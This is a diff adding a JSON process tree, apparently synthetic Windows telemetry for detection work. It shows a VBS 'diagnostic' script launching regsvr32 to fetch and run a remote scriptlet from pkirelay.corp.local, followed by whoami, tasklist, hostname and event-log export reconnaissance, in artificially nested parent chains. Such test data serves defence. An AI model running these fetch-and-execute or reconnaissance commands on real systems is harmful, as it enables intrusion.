@@ -1,0 +1,213 @@
+{
+  "pid": 220254,
+  "ppid": 0,
+  "name": "services.exe",
+  "command": "services.exe -k DcomLaunch",
+  "children": [
+    {
+      "pid": 220257,
+      "ppid": 220254,
+      "name": "cscript.exe",
+      "command": "cscript.exe //nologo \"C:\\IT\\Deploy\\Diag_6981c780.vbs\" /verify",
+      "children": [
+        {
+          "pid": 220262,
+          "ppid": 220257,
+          "name": "regsvr32.exe",
+          "command": "regsvr32.exe /s /n /u /i:\"http://pkirelay.corp.local/diag/collect.sct\" scrobj.dll",
+          "children": [
+            {
+              "pid": 220269,
+              "ppid": 220262,
+              "name": "hostname.exe",
+              "command": "hostname.exe > \"C:\\Users\\rohan.kulkarni\\AppData\\Local\\Temp\\host_51f42584.txt\"",
+              "children": [
+                {
+                  "pid": 220270,
+                  "ppid": 220269,
+                  "name": "whoami.exe",
+                  "command": "whoami.exe /priv",
+                  "children": [
+                    {
+                      "pid": 220277,
+                      "ppid": 220270,
+                      "name": "cmd.exe",
+                      "command": "cmd.exe /c \"whoami /all\"",
+                      "children": [
+                        {
+                          "pid": 220282,
+                          "ppid": 220277,
+                          "name": "hostname.exe",
+                          "command": "hostname.exe > \"C:\\Users\\rohan.kulkarni\\AppData\\Local\\Temp\\host_28f1e244.txt\"",
+                          "children": [
+                            {
+                              "pid": 220285,
+                              "ppid": 220282,
+                              "name": "whoami.exe",
+                              "command": "whoami.exe /priv",
+                              "children": [
+                                {
+                                  "pid": 220287,
+                                  "ppid": 220285,
+                                  "name": "findstr.exe",
+                                  "command": "findstr.exe /i \"WARN\" \"C:\\ProgramData\\Woodgrove\\Logs\\support.log\"",
+                                  "children": [
+                                    {
+                                      "pid": 220294,
+                                      "ppid": 220287,
+                                      "name": "hostname.exe",
+                                      "command": "hostname.exe > \"C:\\Users\\rohan.kulkarni\\AppData\\Local\\Temp\\host_758f4c7d.txt\"",
+                                      "children": [
+                                        {
+                                          "pid": 220300,
+                                          "ppid": 220294,
+                                          "name": "hostname.exe",
+                                          "command": "hostname.exe > \"C:\\Users\\rohan.kulkarni\\AppData\\Local\\Temp\\host_ff096ec8.txt\"",
+                                          "children": [
+                                            {
+                                              "pid": 220302,
+                                              "ppid": 220300,
+                                              "name": "tasklist.exe",
+                                              "command": "tasklist.exe /v",
+                                              "children": [
+                                                {
+                                                  "pid": 220304,
+                                                  "ppid": 220302,
+                                                  "name": "hostname.exe",
+                                                  "command": "hostname.exe",
+                                                  "children": []
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    },
+                                    {
+                                      "pid": 220306,
+                                      "ppid": 220287,
+                                      "name": "ping.exe",
+                                      "command": "ping.exe -n 10 127.0.0.1 > nul",
+                                      "children": [
+                                        {
+                                          "pid": 220310,
+                                          "ppid": 220306,
+                                          "name": "hostname.exe",
+                                          "command": "hostname.exe",
+                                          "children": [
+                                            {
+                                              "pid": 220316,
+                                              "ppid": 220310,
+                                              "name": "wevtutil.exe",
+                                              "command": "wevtutil.exe epl \"System\" \"C:\\ProgramData\\Alpine\\Logs\\System_d1713647.evtx\"",
+                                              "children": [
+                                                {
+                                                  "pid": 220320,
+                                                  "ppid": 220316,
+                                                  "name": "hostname.exe",
+                                                  "command": "hostname.exe > \"C:\\Users\\rohan.kulkarni\\AppData\\Local\\Temp\\host_41f383d6.txt\"",
+                                                  "children": [
+                                                    {
+                                                      "pid": 220321,
+                                                      "ppid": 220320,
+                                                      "name": "whoami.exe",
+                                                      "command": "whoami.exe /groups",
+                                                      "children": [
+                                                        {
+                                                          "pid": 220349,
+                                                          "ppid": 220321,
+                                                          "name": "whoami.exe",
+                                                          "command": "whoami.exe /groups",
+                                                          "children": [
+                                                            {
+                                                              "pid": 220354,
+                                                              "ppid": 220349,
+                                                              "name": "hostname.exe",
+                                                              "command": "hostname.exe > \"C:\\Users\\rohan.kulkarni\\AppData\\Local\\Temp\\host_c34f3c7f.txt\"",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 220357,
+                                                                  "ppid": 220354,
+                                                                  "name": "tasklist.exe",
+                                                                  "command": "tasklist.exe /svc",
+                                                                  "children": [
+                                                                    {
+                                                                      "pid": 220364,
+                                                                      "ppid": 220357,
+                                                                      "name": "timeout.exe",
+                                                                      "command": "timeout.exe /t 15 /nobreak",
+                                                                      "children": []
+                                                                    }
+                                                                  ]
+                                                                }
+                                                              ]
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 220323,
+      "ppid": 220254,
+      "name": "tasklist.exe",
+      "command": "tasklist.exe /svc",
+      "children": [
+        {
+          "pid": 220330,
+          "ppid": 220323,
+          "name": "timeout.exe",
+          "command": "timeout.exe /t 6 /nobreak",
+          "children": [
+            {
+              "pid": 220336,
+              "ppid": 220330,
+              "name": "tasklist.exe",
+              "command": "tasklist.exe /svc",
+              "children": [
+                {
+                  "pid": 220341,
+                  "ppid": 220336,
+                  "name": "timeout.exe",
+                  "command": "timeout.exe /t 24 /nobreak",
+                  "children": [
+                    {
+                      "pid": 220346,
+                      "ppid": 220341,
+                      "name": "ping.exe",
+                      "command": "ping.exe -n 24 127.0.0.1 > nul",
+                      "children": []
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
